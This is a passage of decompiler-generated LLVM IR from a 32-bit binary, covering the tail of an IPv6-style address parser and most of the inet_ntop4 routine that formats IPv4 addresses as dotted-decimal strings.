  %v11_8057c2a = icmp eq i8 %v2_8057c2a, 58
  %v1_8057c2d = icmp eq i1 %v11_8057c2a, false
  br i1 %v1_8057c2d, label %dec_label_pc_8057d9a, label %dec_label_pc_8057cba

dec_label_pc_8057c41:                             ; preds = %dec_label_pc_8057cfa
  %v0_8057c42 = load i32, i32* @edi, align 4
  %v1_8057c42 = add i32 %v0_8057c42, 1
  store i32 %v1_8057c42, i32* @edi, align 4
  %v4_8057c4a = call i32 @__GI_strchr(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_805d494.596, i32 0, i32 0), i32 %v2_8057d01)
  store i32 %v4_8057c4a, i32* %eax.global-to-local, align 4
  %v1_8057c52 = icmp eq i32 %v4_8057c4a, 0
  br i1 %v1_8057c52, label %dec_label_pc_8057c71, label %dec_label_pc_8057c56

dec_label_pc_8057c56:                             ; preds = %dec_label_pc_8057c41
  %v0_8057c56 = load i32, i32* @ebp, align 4
  %v2_8057c56 = mul i32 %v0_8057c56, 16
  %v1_8057c59 = add i32 %v4_8057c4a, -134599828
  store i32 %v1_8057c59, i32* %eax.global-to-local, align 4
  %v2_8057c5e = or i32 %v2_8057c56, %v1_8057c59
  store i32 %v2_8057c5e, i32* @ebp, align 4
  %tmp = icmp ult i32 %v2_8057c5e, 65536
  br i1 %tmp, label %dec_label_pc_8057c56.dec_label_pc_8057cfa.outer_crit_edge, label %dec_label_pc_8057d9a

dec_label_pc_8057c56.dec_label_pc_8057cfa.outer_crit_edge: ; preds = %dec_label_pc_8057c56
  %v0_8057cfa.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8057cfa.outer

dec_label_pc_8057cfa.outer:                       ; preds = %dec_label_pc_8057c56.dec_label_pc_8057cfa.outer_crit_edge, %dec_label_pc_8057cba
  %v0_8057cfa.pre = phi i32 [ %v0_8057cfa.pre.pre, %dec_label_pc_8057c56.dec_label_pc_8057cfa.outer_crit_edge ], [ %stack_var_-36.0.in, %dec_label_pc_8057cba ]
  %stack_var_-44.1.ph = phi i8* [ %stack_var_-44.1, %dec_label_pc_8057c56.dec_label_pc_8057cfa.outer_crit_edge ], [ %stack_var_-44.0, %dec_label_pc_8057cba ]
  %stack_var_-36.1.ph = phi i8* [ %stack_var_-36.1, %dec_label_pc_8057c56.dec_label_pc_8057cfa.outer_crit_edge ], [ %stack_var_-36.0, %dec_label_pc_8057cba ]
  %stack_var_-48.0.ph = phi i32 [ 1, %dec_label_pc_8057c56.dec_label_pc_8057cfa.outer_crit_edge ], [ 0, %dec_label_pc_8057cba ]
  %v4_8057c76 = icmp eq i32 %stack_var_-48.0.ph, 0
  %v1_8057c7b = icmp eq i1 %v4_8057c76, false
  br label %dec_label_pc_8057cfa

dec_label_pc_8057c71:                             ; preds = %dec_label_pc_8057c41
  %v0_8057c71 = load i32, i32* @esi, align 4
  %v9_8057c71 = icmp eq i32 %v0_8057c71, 58
  %v1_8057c74 = icmp eq i1 %v9_8057c71, false
  br i1 %v1_8057c74, label %dec_label_pc_8057cc6, label %dec_label_pc_8057c76

dec_label_pc_8057c76:                             ; preds = %dec_label_pc_8057c71
  br i1 %v1_8057c7b, label %dec_label_pc_8057c92, label %dec_label_pc_8057c7d

dec_label_pc_8057c7d:                             ; preds = %dec_label_pc_8057c76
  %v5_8057c7d = icmp eq i8* %stack_var_-44.1, null
  %v1_8057c82 = icmp eq i1 %v5_8057c7d, false
  br i1 %v1_8057c82, label %dec_label_pc_8057d9a, label %dec_label_pc_8057c88

dec_label_pc_8057c88:                             ; preds = %dec_label_pc_8057c7d
  %v0_8057c88 = load i32, i32* @ebx, align 4
  %v5_8057c88 = inttoptr i32 %v0_8057c88 to i8*
  %v0_8057c8c = load i32, i32* @edi, align 4
  %v5_8057c8c = inttoptr i32 %v0_8057c8c to i8*
  br label %dec_label_pc_8057cfa

dec_label_pc_8057c92:                             ; preds = %dec_label_pc_8057c76
  %v0_8057c92 = load i32, i32* @edi, align 4
  %v1_8057c92 = inttoptr i32 %v0_8057c92 to i8*
  %v2_8057c92 = load i8, i8* %v1_8057c92, align 1
  %v3_8057c92 = icmp eq i8 %v2_8057c92, 0
  br i1 %v3_8057c92, label %dec_label_pc_8057d9a, label %dec_label_pc_8057c9b

dec_label_pc_8057c9b:                             ; preds = %dec_label_pc_8057c92
  %v0_8057c9b = load i32, i32* @ebx, align 4
  %v1_8057c9b = add i32 %v0_8057c9b, 2
  store i32 %v1_8057c9b, i32* @edx, align 4
  %v6_8057ca2 = icmp ugt i32 %v1_8057c9b, %v2_8057c1a
  br i1 %v6_8057ca2, label %dec_label_pc_8057d9a, label %dec_label_pc_8057ca8

dec_label_pc_8057ca8:                             ; preds = %dec_label_pc_8057c9b
  %v0_8057ca8 = load i32, i32* @ebp, align 4
  %v2_8057caa = udiv i32 %v0_8057ca8, 256
  %v4_8057caa = trunc i32 %v2_8057caa to i8
  %v3_8057cad = inttoptr i32 %v0_8057c9b to i8*
  store i8 %v4_8057caa, i8* %v3_8057cad, align 1
  %v0_8057caf = load i32, i32* @ebp, align 4
  store i32 %v0_8057caf, i32* %eax.global-to-local, align 4
  %v1_8057cb1 = trunc i32 %v0_8057caf to i8
  %v2_8057cb1 = load i32, i32* @ebx, align 4
  %v3_8057cb1 = add i32 %v2_8057cb1, 1
  %v4_8057cb1 = inttoptr i32 %v3_8057cb1 to i8*
  store i8 %v1_8057cb1, i8* %v4_8057cb1, align 1
  %v0_8057cb4 = load i32, i32* @edx, align 4
  store i32 %v0_8057cb4, i32* @ebx, align 4
  %stack_var_-36.0.in.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8057cba

dec_label_pc_8057cba:                             ; preds = %dec_label_pc_8057c09, %dec_label_pc_8057c29, %dec_label_pc_8057ca8
  %stack_var_-36.0.in = phi i32 [ %stack_var_-36.0.in.pre, %dec_label_pc_8057ca8 ], [ %v1_8057c29, %dec_label_pc_8057c29 ], [ %v0_8057c24, %dec_label_pc_8057c09 ]
  %stack_var_-44.0 = phi i8* [ %stack_var_-44.1, %dec_label_pc_8057ca8 ], [ null, %dec_label_pc_8057c29 ], [ null, %dec_label_pc_8057c09 ]
  %stack_var_-36.0 = inttoptr i32 %stack_var_-36.0.in to i8*
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8057cfa.outer

dec_label_pc_8057cc6:                             ; preds = %dec_label_pc_8057c71
  %v9_8057cc6 = icmp eq i32 %v0_8057c71, 46
  %v1_8057cc9 = icmp eq i1 %v9_8057cc6, false
  br i1 %v1_8057cc9, label %dec_label_pc_8057d9a, label %dec_label_pc_8057ccf

dec_label_pc_8057ccf:                             ; preds = %dec_label_pc_8057cc6
  %v0_8057ccf = load i32, i32* @ebx, align 4
  %v1_8057ccf = add i32 %v0_8057ccf, 4
  store i32 %v1_8057ccf, i32* @esi, align 4
  %v6_8057cd6 = icmp ugt i32 %v1_8057ccf, %v2_8057c1a
  br i1 %v6_8057cd6, label %dec_label_pc_8057d9a, label %dec_label_pc_8057cdc

dec_label_pc_8057cdc:                             ; preds = %dec_label_pc_8057ccf
  %v4_8057cdc = ptrtoint i8* %stack_var_-36.1 to i32
  store i32 %v4_8057cdc, i32* @eax, align 4
  store i32 %v0_8057ccf, i32* @edx, align 4
  store i32 %v1_8057ccf, i32* @ebx, align 4
  %v2_8057ce4 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_8057ce4 = call i32 @inet_pton4(i32 %stack_var_-48.0.ph, i32 %v2_8057ce4, i32 %v2_8057c1a)
  store i32 %v5_8057ce4, i32* %eax.global-to-local, align 4
  %tmp61 = icmp slt i32 %v5_8057ce4, 1
  %tmp62 = icmp eq i1 %tmp61, false
  br i1 %tmp62, label %dec_label_pc_8057d31, label %dec_label_pc_8057d9a

dec_label_pc_8057cfa:                             ; preds = %dec_label_pc_8057cfa.outer, %dec_label_pc_8057c88
  %v0_8057cfa = phi i32 [ %v0_8057c8c, %dec_label_pc_8057c88 ], [ %v0_8057cfa.pre, %dec_label_pc_8057cfa.outer ]
  %stack_var_-44.1 = phi i8* [ %v5_8057c88, %dec_label_pc_8057c88 ], [ %stack_var_-44.1.ph, %dec_label_pc_8057cfa.outer ]
  %stack_var_-36.1 = phi i8* [ %v5_8057c8c, %dec_label_pc_8057c88 ], [ %stack_var_-36.1.ph, %dec_label_pc_8057cfa.outer ]
  %v1_8057cfa = inttoptr i32 %v0_8057cfa to i8*
  %v2_8057cfa = load i8, i8* %v1_8057cfa, align 1
  %v3_8057cfa = sext i8 %v2_8057cfa to i32
  store i32 %v3_8057cfa, i32* %eax.global-to-local, align 4
  %v2_8057d01 = call i32 @__GI_tolower(i32 %v3_8057cfa)
  store i32 %v2_8057d01, i32* %eax.global-to-local, align 4
  %v1_8057d09 = icmp eq i32 %v2_8057d01, 0
  store i32 %v2_8057d01, i32* @esi, align 4
  %v1_8057d0d = icmp eq i1 %v1_8057d09, false
  br i1 %v1_8057d0d, label %dec_label_pc_8057c41, label %dec_label_pc_8057d13

dec_label_pc_8057d13:                             ; preds = %dec_label_pc_8057cfa
  br i1 %v4_8057c76, label %dec_label_pc_8057d31, label %dec_label_pc_8057d1a

dec_label_pc_8057d1a:                             ; preds = %dec_label_pc_8057d13
  %v0_8057d1a = load i32, i32* @ebx, align 4
  %v1_8057d1a = add i32 %v0_8057d1a, 2
  store i32 %v1_8057d1a, i32* @edx, align 4
  %v6_8057d21 = icmp ugt i32 %v1_8057d1a, %v2_8057c1a
  br i1 %v6_8057d21, label %dec_label_pc_8057d9a, label %dec_label_pc_8057d23

dec_label_pc_8057d23:                             ; preds = %dec_label_pc_8057d1a
  %v0_8057d23 = load i32, i32* @ebp, align 4
  %v2_8057d25 = udiv i32 %v0_8057d23, 256
  %v4_8057d25 = trunc i32 %v2_8057d25 to i8
  %v3_8057d28 = inttoptr i32 %v0_8057d1a to i8*
  store i8 %v4_8057d25, i8* %v3_8057d28, align 1
  %v0_8057d2a = load i32, i32* @ebp, align 4
  store i32 %v0_8057d2a, i32* %eax.global-to-local, align 4
  %v1_8057d2c = trunc i32 %v0_8057d2a to i8
  %v2_8057d2c = load i32, i32* @ebx, align 4
  %v3_8057d2c = add i32 %v2_8057d2c, 1
  %v4_8057d2c = inttoptr i32 %v3_8057d2c to i8*
  store i8 %v1_8057d2c, i8* %v4_8057d2c, align 1
  %v0_8057d2f = load i32, i32* @edx, align 4
  store i32 %v0_8057d2f, i32* @ebx, align 4
  br label %dec_label_pc_8057d31

dec_label_pc_8057d31:                             ; preds = %dec_label_pc_8057d13, %dec_label_pc_8057cdc, %dec_label_pc_8057d23
  %v4_8057d31 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_8057d31 = icmp eq i8* %stack_var_-44.1, null
  %v0_8057d69.pre = load i32, i32* @ebx, align 4
  br i1 %v5_8057d31, label %dec_label_pc_8057d69, label %dec_label_pc_8057d38

dec_label_pc_8057d38:                             ; preds = %dec_label_pc_8057d31
  store i32 1, i32* @esi, align 4
  %v6_8057d3f = sub i32 %v0_8057d69.pre, %v4_8057d31
  store i32 %v6_8057d3f, i32* @edi, align 4
  %v16_8057d43 = icmp eq i32 %v0_8057d69.pre, %v2_8057c1a
  %v1_8057d47 = icmp eq i1 %v16_8057d43, false
  br i1 %v1_8057d47, label %dec_label_pc_8057d61.preheader, label %dec_label_pc_8057d9a

dec_label_pc_8057d61.preheader:                   ; preds = %dec_label_pc_8057d38
  %v3_8057d6188 = inttoptr i32 %v6_8057d3f to i8*
  %v9_8057d6397 = icmp slt i8* %v3_8057d6188, inttoptr (i32 1 to i8*)
  br i1 %v9_8057d6397, label %dec_label_pc_8057d65, label %dec_label_pc_8057d4b

dec_label_pc_8057d4b:                             ; preds = %dec_label_pc_8057d61.preheader, %dec_label_pc_8057d4b
  %v0_8057d5999 = phi i32 [ %v0_8057d61.pre, %dec_label_pc_8057d4b ], [ 1, %dec_label_pc_8057d61.preheader ]
  %v0_8057d4b98 = phi i32 [ %v1_8057d61.pre, %dec_label_pc_8057d4b ], [ %v6_8057d3f, %dec_label_pc_8057d61.preheader ]
  %v2_8057d51 = sub i32 %v0_8057d4b98, %v0_8057d5999
  %v6_8057d53 = add i32 %v2_8057d51, %v4_8057d31
  store i32 %v6_8057d53, i32* %eax.global-to-local, align 4
  %v2_8057d57 = sub i32 %v2_8057c1a, %v0_8057d5999
  store i32 %v2_8057d57, i32* @ecx, align 4
  %v1_8057d59 = add i32 %v0_8057d5999, 1
  store i32 %v1_8057d59, i32* @esi, align 4
  %v1_8057d5a = inttoptr i32 %v6_8057d53 to i8*
  %v2_8057d5a = load i8, i8* %v1_8057d5a, align 1
  %v3_8057d5a = zext i8 %v2_8057d5a to i32
  %v4_8057d5a = load i32, i32* @edx, align 4
  %v5_8057d5a = and i32 %v4_8057d5a, -256
  %v6_8057d5a = or i32 %v5_8057d5a, %v3_8057d5a
  store i32 %v6_8057d5a, i32* @edx, align 4
  %v3_8057d5c = inttoptr i32 %v2_8057d57 to i8*
  store i8 %v2_8057d5a, i8* %v3_8057d5c, align 1
  %v0_8057d5e = load i32, i32* %eax.global-to-local, align 4
  %v1_8057d5e = inttoptr i32 %v0_8057d5e to i8*
  store i8 0, i8* %v1_8057d5e, align 1
  %v0_8057d61.pre = load i32, i32* @esi, align 4
  %v1_8057d61.pre = load i32, i32* @edi, align 4
  %v2_8057d61 = inttoptr i32 %v0_8057d61.pre to i8*
  %v3_8057d61 = inttoptr i32 %v1_8057d61.pre to i8*
  %v9_8057d63 = icmp sgt i8* %v2_8057d61, %v3_8057d61
  br i1 %v9_8057d63, label %dec_label_pc_8057d65, label %dec_label_pc_8057d4b

dec_label_pc_8057d65:                             ; preds = %dec_label_pc_8057d4b, %dec_label_pc_8057d61.preheader
  br label %dec_label_pc_8057d69

dec_label_pc_8057d69:                             ; preds = %dec_label_pc_8057d31, %dec_label_pc_8057d65
  %v0_8057d69 = phi i32 [ %v2_8057c1a, %dec_label_pc_8057d65 ], [ %v0_8057d69.pre, %dec_label_pc_8057d31 ]
  %v16_8057d69 = icmp eq i32 %v0_8057d69, %v2_8057c1a
  %v1_8057d6d = icmp eq i1 %v16_8057d69, false
  br i1 %v1_8057d6d, label %dec_label_pc_8057d9a, label %dec_label_pc_8057d6f

dec_label_pc_8057d6f:                             ; preds = %dec_label_pc_8057d69
  store i32 %v2_8057c0e, i32* %eax.global-to-local, align 4
  %tmp63 = inttoptr i32 %arg3 to i16*
  %v5_8057d7b = call i32 @memcpy(i16* %tmp63, i32 %v2_8057c0e, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057d9c

dec_label_pc_8057d8a:                             ; preds = %dec_label_pc_8057bee
  %v1_8057d8a = call i32 @__errno_location(i32 %v0_8057bdd)
  %v1_8057d8f = inttoptr i32 %v1_8057d8a to i32*
  store i32 97, i32* %v1_8057d8f, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057d9c

dec_label_pc_8057d9a:                             ; preds = %dec_label_pc_8057c9b, %dec_label_pc_8057c92, %dec_label_pc_8057c56, %dec_label_pc_8057c7d, %dec_label_pc_8057d38, %dec_label_pc_8057cdc, %dec_label_pc_8057d69, %dec_label_pc_8057d1a, %dec_label_pc_8057ccf, %dec_label_pc_8057cc6, %dec_label_pc_8057c29
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057d9c

dec_label_pc_8057d9c:                             ; preds = %dec_label_pc_8057d8a, %dec_label_pc_8057d6f, %dec_label_pc_8057bf9, %dec_label_pc_8057d9a
  %v0_8057da3 = phi i32 [ -1, %dec_label_pc_8057d8a ], [ 1, %dec_label_pc_8057d6f ], [ %v3_8057bff, %dec_label_pc_8057bf9 ], [ 0, %dec_label_pc_8057d9a ]
  store i32 %v0_8057bdd, i32* @ebx, align 4
  store i32 %v0_8057bdc, i32* @esi, align 4
  store i32 %v0_8057bdb, i32* @edi, align 4
  store i32 %v0_8057bda, i32* @ebp, align 4
  ret i32 %v0_8057da3

; uselistorder directives
  uselistorder i32 %v1_8057d61.pre, { 1, 0 }
  uselistorder i32 %v0_8057d61.pre, { 1, 0 }
  uselistorder i32 %v0_8057d5999, { 2, 1, 0 }
  uselistorder i32 %v0_8057d69.pre, { 1, 0, 2 }
  uselistorder i32 %v2_8057d01, { 1, 2, 3, 0 }
  uselistorder i8* %stack_var_-36.1, { 1, 0 }
  uselistorder i8* %stack_var_-44.1, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %stack_var_-36.0.in, { 1, 0 }
  uselistorder i32 %v2_8057c1a, { 0, 2, 3, 1, 7, 4, 5, 6, 8 }
  uselistorder i32 %v0_8057bdd, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 11, 12, 7, 8, 9, 10, 13, 14, 15, 16 }
  uselistorder i32 58, { 0, 6, 2, 3, 4, 5, 1 }
  uselistorder i32 (i32, i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8057d9c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8057d9a, { 6, 4, 7, 5, 8, 9, 0, 1, 3, 2, 10 }
  uselistorder label %dec_label_pc_8057d69, { 1, 0 }
  uselistorder label %dec_label_pc_8057d4b, { 1, 0 }
  uselistorder label %dec_label_pc_8057d31, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057cfa, { 1, 0 }
  uselistorder label %dec_label_pc_8057cba, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8057cfa.outer, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-56 = alloca i8*, align 4
  %stack_var_-92 = alloca i8*, align 4
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-31 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %v0_8057da5 = load i32, i32* @edi, align 4
  %v0_8057da6 = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v15_8057daa = ptrtoint i32* %stack_var_-76 to i32
  %v0_8057dad = load i32, i32* @eax, align 4
  %v3_8057db1 = and i32 %v0_8057dad, -65536
  %v2_8057db7 = ptrtoint i32* %stack_var_-31 to i32
  store i1 false, i1* @df, align 1
  %v0_8057dbc = load i32, i32* @edx, align 4
  %v5_8057dbc = inttoptr i32 %v0_8057dbc to i8*
  store i8* %v5_8057dbc, i8** %stack_var_-56, align 4
  %v0_8057dc0 = load i32, i32* @ecx, align 4
  store i32 %v3_8057db1, i32* %stack_var_-33, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-31, align 4
  %v6_8057dcb = add i32 %v2_8057db7, 4
  store i32 %v6_8057dcb, i32* %edi.global-to-local, align 4
  %v2_8057dcc = inttoptr i32 %v6_8057dcb to i32*
  store i32 0, i32* %v2_8057dcc, align 4
  %v3_8057dcc = load i32, i32* %edi.global-to-local, align 4
  %v6_8057dcc = add i32 %v3_8057dcc, 4
  store i32 %v6_8057dcc, i32* %edi.global-to-local, align 4
  %v0_8057dcd = load i32, i32* %eax.global-to-local, align 4
  %v2_8057dcd = inttoptr i32 %v6_8057dcc to i32*
  store i32 %v0_8057dcd, i32* %v2_8057dcd, align 4
  %v3_8057dcd = load i32, i32* %edi.global-to-local, align 4
  %v6_8057dcd = add i32 %v3_8057dcd, 4
  store i32 %v6_8057dcd, i32* %edi.global-to-local, align 4
  %v0_8057dce = load i32, i32* %eax.global-to-local, align 4
  %v1_8057dce = trunc i32 %v0_8057dce to i16
  %v3_8057dce = inttoptr i32 %v6_8057dcd to i16*
  store i16 %v1_8057dce, i16* %v3_8057dce, align 2
  %v4_8057dce = load i32, i32* %edi.global-to-local, align 4
  %v7_8057dce = add i32 %v4_8057dce, 2
  %v0_8057dd0 = load i32, i32* %eax.global-to-local, align 4
  %v1_8057dd0 = trunc i32 %v0_8057dd0 to i8
  %v3_8057dd0 = inttoptr i32 %v7_8057dce to i8*
  store i8 %v1_8057dd0, i8* %v3_8057dd0, align 1
  store i32 0, i32* %edi.global-to-local, align 4
  %v0_8057e6b30 = load i32, i32* @esi, align 4
  %v10_8057e6b36 = icmp eq i32 %v0_8057e6b30, 3
  store i1 %v10_8057e6b36, i1* %zf.global-to-local, align 1
  %v7_8057e6e38 = icmp sgt i32 %v0_8057e6b30, 3
  br i1 %v7_8057e6e38, label %dec_label_pc_8057e74, label %dec_label_pc_8057dd8

dec_label_pc_8057dd8:                             ; preds = %dec_label_pc_8057e4b, %entry
  %v3_8057dee = phi i32 [ 0, %entry ], [ %v1_8057e74.pre, %dec_label_pc_8057e4b ]
  %v0_8057e6b39 = phi i32 [ %v0_8057e6b30, %entry ], [ %v0_8057e6b, %dec_label_pc_8057e4b ]
  %v2_8057dde = add i32 %v0_8057e6b39, %v0_8057dad
  %v12_8057dde = icmp eq i32 %v2_8057dde, 0
  store i1 %v12_8057dde, i1* %zf.global-to-local, align 1
  store i32 %v2_8057dde, i32* %ebp.global-to-local, align 4
  %v1_8057de0 = inttoptr i32 %v2_8057dde to i8*
  %v2_8057de0 = load i8, i8* %v1_8057de0, align 1
  %v3_8057de0 = zext i8 %v2_8057de0 to i32
  %v4_8057de0 = load i32, i32* @edx, align 4
  %v5_8057de0 = and i32 %v4_8057de0, -65536
  %v6_8057de0 = or i32 %v5_8057de0, %v3_8057de0
  store i32 %v6_8057de0, i32* %edx.global-to-local, align 4
  %div8 = udiv i8 %v2_8057de0, 100
  %v6_8057de7 = zext i8 %div8 to i32
  %tmp24 = urem i8 %v2_8057de0, 100
  %v12_8057de7 = zext i8 %tmp24 to i32
  %v14_8057de7 = mul nuw nsw i32 %v12_8057de7, 256
  %v15_8057de7 = or i32 %v6_8057de7, %v5_8057de0
  %v16_8057de7 = or i32 %v15_8057de7, %v14_8057de7
  store i32 %v16_8057de7, i32* %eax.global-to-local, align 4
  %v2_8057deb = or i8 %div8, 48
  store i1 false, i1* %zf.global-to-local, align 1
  %v2_8057dee = load i32, i32* @esp, align 4
  %v4_8057dee = add i32 %v2_8057dee, 43
  %v5_8057dee = add i32 %v4_8057dee, %v3_8057dee
  %v6_8057dee = inttoptr i32 %v5_8057dee to i8*
  store i8 %v2_8057deb, i8* %v6_8057dee, align 1
  %v0_8057df2 = load i32, i32* %edi.global-to-local, align 4
  %v1_8057df2 = add i32 %v0_8057df2, 1
  store i32 %v0_8057df2, i32* @ecx, align 4
  %v0_8057dfb = load i32, i32* @esp, align 4
  %v2_8057dfb = add i32 %v0_8057df2, 43
  %v3_8057dfb = add i32 %v2_8057dfb, %v0_8057dfb
  %v4_8057dfb = inttoptr i32 %v3_8057dfb to i8*
  %v5_8057dfb = load i8, i8* %v4_8057dfb, align 1
  %v11_8057dfb = icmp eq i8 %v5_8057dfb, 48
  store i1 %v11_8057dfb, i1* %zf.global-to-local, align 1
  %v1_8057e00 = icmp eq i1 %v11_8057dfb, false
  %v0_8057e2a = load i32, i32* %edx.global-to-local, align 4
  br i1 %v1_8057e00, label %dec_label_pc_8057e28, label %dec_label_pc_8057e02

dec_label_pc_8057e02:                             ; preds = %dec_label_pc_8057dd8
  %v3_8057e06 = trunc i32 %v0_8057e2a to i16
  %v5_8057e06 = udiv i16 %v3_8057e06, 10
  store i32 10, i32* %ebx.global-to-local, align 4
  %tmp = urem i16 %v5_8057e06, 256
  %tmp42 = urem i16 %tmp, 10
  %tmp25 = zext i16 %tmp42 to i32
  store i32 %tmp25, i32* %edx.global-to-local, align 4
  %v1_8057e18 = trunc i16 %tmp42 to i8
  %v2_8057e18 = or i8 %v1_8057e18, 48
  %v12_8057e18 = zext i8 %v2_8057e18 to i32
  store i32 %v12_8057e18, i32* %eax.global-to-local, align 4
  %v7_8057e1a = icmp eq i8 %v1_8057e18, 0
  store i1 %v7_8057e1a, i1* %zf.global-to-local, align 1
  store i8 %v2_8057e18, i8* %v4_8057dfb, align 1
  %v0_8057e20 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8057e20, label %dec_label_pc_8057e4b, label %dec_label_pc_8057e22

dec_label_pc_8057e22:                             ; preds = %dec_label_pc_8057e02
  store i32 %v1_8057df2, i32* @ecx, align 4
  br label %dec_label_pc_8057e4b

dec_label_pc_8057e28:                             ; preds = %dec_label_pc_8057dd8
  store i32 %v1_8057df2, i32* %ebx.global-to-local, align 4
  %v3_8057e30 = trunc i32 %v0_8057e2a to i16
  %v5_8057e30 = udiv i16 %v3_8057e30, 10
  %tmp43 = urem i16 %v5_8057e30, 256
  %tmp44 = urem i16 %tmp43, 10
  %tmp26 = zext i16 %tmp44 to i32
  store i32 %tmp26, i32* %edx.global-to-local, align 4
  %v1_8057e40 = add i32 %v0_8057df2, 2
  store i32 %v1_8057e40, i32* @ecx, align 4
  %v1_8057e45 = trunc i16 %tmp44 to i8
  %v2_8057e45 = or i8 %v1_8057e45, 48
  store i1 false, i1* %zf.global-to-local, align 1
  %v12_8057e45 = zext i8 %v2_8057e45 to i32
  store i32 %v12_8057e45, i32* %eax.global-to-local, align 4
  %v4_8057e47 = add i32 %v0_8057df2, 44
  %v5_8057e47 = add i32 %v4_8057e47, %v0_8057dfb
  %v6_8057e47 = inttoptr i32 %v5_8057e47 to i8*
  store i8 %v2_8057e45, i8* %v6_8057e47, align 1
  br label %dec_label_pc_8057e4b

dec_label_pc_8057e4b:                             ; preds = %dec_label_pc_8057e02, %dec_label_pc_8057e22, %dec_label_pc_8057e28
  %v0_8057e4b = load i32, i32* %ebp.global-to-local, align 4
  %v1_8057e4b = inttoptr i32 %v0_8057e4b to i8*
  %v2_8057e4b = load i8, i8* %v1_8057e4b, align 1
  %v3_8057e4b = zext i8 %v2_8057e4b to i32
  store i32 %v3_8057e4b, i32* %eax.global-to-local, align 4
  %v0_8057e54 = load i32, i32* @esi, align 4
  %v1_8057e54 = add i32 %v0_8057e54, 1
  store i32 %v1_8057e54, i32* @esi, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_8057e59 = load i32, i32* @esp, align 4
  %v1_8057e59 = load i32, i32* @ecx, align 4
  %v2_8057e59 = add i32 %v0_8057e59, 44
  %v3_8057e59 = add i32 %v2_8057e59, %v1_8057e59
  %v4_8057e59 = inttoptr i32 %v3_8057e59 to i8*
  store i8 46, i8* %v4_8057e59, align 1
  %v0_8057e5e = load i32, i32* @ecx, align 4
  %v1_8057e5e = add i32 %v0_8057e5e, 2
  store i32 %v1_8057e5e, i32* %edi.global-to-local, align 4
  %v0_8057e61 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057e61 = load i32, i32* %eax.global-to-local, align 4
  %v2_8057e61 = zext i32 %v1_8057e61 to i64
  %v3_8057e61 = load i32, i32* %edx.global-to-local, align 4
  %v4_8057e61 = zext i32 %v3_8057e61 to i64
  %v5_8057e61 = mul nuw i64 %v4_8057e61, 4294967296
  %v6_8057e61 = or i64 %v5_8057e61, %v2_8057e61
  %v7_8057e61 = zext i32 %v0_8057e61 to i64
  %v8_8057e61 = udiv i64 %v6_8057e61, %v7_8057e61
  %v9_8057e61 = trunc i64 %v8_8057e61 to i32
  %v10_8057e61 = urem i64 %v6_8057e61, %v7_8057e61
  %v11_8057e61 = trunc i64 %v10_8057e61 to i32
  store i32 %v11_8057e61, i32* @edx, align 4
  %v3_8057e63 = and i32 %v9_8057e61, -256
  %v1_8057e65 = trunc i64 %v10_8057e61 to i8
  %v2_8057e65 = add i8 %v1_8057e65, 48
  %v12_8057e65 = zext i8 %v2_8057e65 to i32
  %v15_8057e65 = or i32 %v12_8057e65, %v3_8057e63
  store i32 %v15_8057e65, i32* %eax.global-to-local, align 4
  %v2_8057e67 = load i32, i32* @esp, align 4
  %v4_8057e67 = add i32 %v0_8057e5e, 43
  %v5_8057e67 = add i32 %v4_8057e67, %v2_8057e67
  %v6_8057e67 = inttoptr i32 %v5_8057e67 to i8*
  store i8 %v2_8057e65, i8* %v6_8057e67, align 1
  %v0_8057e6b = load i32, i32* @esi, align 4
  %v10_8057e6b = icmp eq i32 %v0_8057e6b, 3
  store i1 %v10_8057e6b, i1* %zf.global-to-local, align 1
  %v7_8057e6e = icmp sgt i32 %v0_8057e6b, 3
  %v1_8057e74.pre = load i32, i32* %edi.global-to-local, align 4
  br i1 %v7_8057e6e, label %dec_label_pc_8057e74, label %dec_label_pc_8057dd8

dec_label_pc_8057e74:                             ; preds = %dec_label_pc_8057e4b, %entry
  %v1_8057e74 = phi i32 [ 0, %entry ], [ %v1_8057e74.pre, %dec_label_pc_8057e4b ]
  %v0_8057e74 = load i32, i32* @esp, align 4
  %v2_8057e74 = add i32 %v0_8057e74, 42
  %v3_8057e74 = add i32 %v2_8057e74, %v1_8057e74
  %v4_8057e74 = inttoptr i32 %v3_8057e74 to i8*
  store i8 0, i8* %v4_8057e74, align 1
  %v0_8057e79 = load i32, i32* @esp, align 4
  %v9_8057e79 = icmp eq i32 %v0_8057e79, 12
  store i1 %v9_8057e79, i1* %zf.global-to-local, align 1
  %tmp27 = bitcast i32* %stack_var_-33 to i8*
  store i8* %tmp27, i8** %stack_var_-92, align 4
  %v3_8057e81 = call i32 @strlen(i8* %tmp27)
  store i32 %v3_8057e81, i32* @eax, align 4
  %v15_8057e89 = icmp eq i32 %v3_8057e81, %v0_8057dc0
  store i1 %v15_8057e89, i1* %zf.global-to-local, align 1
